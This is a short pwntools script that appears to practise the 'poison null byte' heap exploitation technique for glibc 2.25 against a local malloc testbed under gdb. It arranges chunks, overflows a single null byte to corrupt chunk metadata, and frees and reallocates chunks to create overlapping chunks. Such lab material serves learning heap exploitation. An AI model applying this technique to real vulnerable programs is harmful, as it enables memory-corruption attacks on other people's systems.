#!/usr/bin/python
from pwn import *
from testbed import *


def poison_nullbyte(p):
    '''glibc 2.25'''

    malloc(p, b'0x18')
    malloc(p, b'0x208')
    malloc(p, b'0x88')

    malloc(p, b'0x18') #guard

    free(p, b'1')
    edit(p, b'0', p64(0)*3 + p8(0))

    malloc(p, b'0x1a8')
    malloc(p, b'0x48')

    free(p, b'4')
    free(p, b'2')

#p = process('./malloc_testbed')
p = gdb.debug('./malloc_testbed', '''
c
''')

libc = get_libc_addr(p)
poison_nullbyte(p)

p.interactive()